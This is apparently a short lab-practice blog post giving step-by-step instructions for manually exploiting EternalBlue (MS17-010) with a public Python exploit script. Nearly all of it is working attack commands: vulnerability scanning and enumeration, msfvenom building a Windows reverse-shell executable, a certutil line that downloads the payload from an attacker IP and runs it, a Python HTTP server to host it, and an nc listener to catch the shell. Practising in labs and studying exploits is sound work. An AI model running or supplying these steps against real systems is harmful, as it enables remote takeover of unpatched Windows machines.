---
date: 2025-05-01
categories: [Fixes, Linux]
title: "EternalBlue Manual Script"
tags: ['linux', 'eternalblue', 'smb', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "EternalBlue Manual Script"
---

# EternalBlue Manual Script

- Find it here:
<https://github.com/player23-0/Eternal_Blue_Manual_Exploit>

- Download 42315.py
- Download the mysmb.py
- Make sure 42315.py & mysmb.py is in the same folder
- Create msf exe (or use other rev shell command)
- In 42315.py - change:
  - Username and password
  - Uncomment this line and add rev shell/ create one:

`service_exec(conn, r'cmd /c certutil -urlcache -split -f http://192.168.119.189/w644444.exe w644444.exe & w644444.exe')`
- Change this line from letters to ascii_letters:

`service_name = ''.join([random.choice(string.ascii_letters) for i in range(4)])`

- Enumeration for eternal blue:

```bash
nmap --script smb-vuln-ms17–010.nse <target-ip>
```

- Prerequisites:

`pip3 install impacket`

- Download 42315.py and mysmb.py
- Make sure 42315.py & mysmb.py is in the same folder

- Use MSFvenom to create a reverse shell payload (allowed on the OSCP as long as you’re not using meterpreter).

`msfvenom -p windows/shell_reverse_tcp -f exe LHOST=<IP> LPORT=4444 > w644444.exe`
- Or use a different payload (revshells.com)

- Make changes in the exploit to add the authentication credentials and the reverse shell payload.
If you dont have credentials, check if guest is allowed:

`enum4linux -a <target_ip>`

Change USERNAME & PASSWORD values on lines 36&37

- Edit line 923:

`service_exec(conn, r'cmd /c certutil -urlcache -split -f http:// <Your IP>/w644444.exe w644444.exe & w644444.exe')`

Add your IP and change the payload if needed

- Setup Python server on port 80:

```bash
python3 -m http.server 80
```

- Now that we're done all three tasks, setup a listener on your attack machine.

```bash
nc -nlvp 4444
```

- Then run the exploit.

```bash
python 42315.py \<target_ip\>
```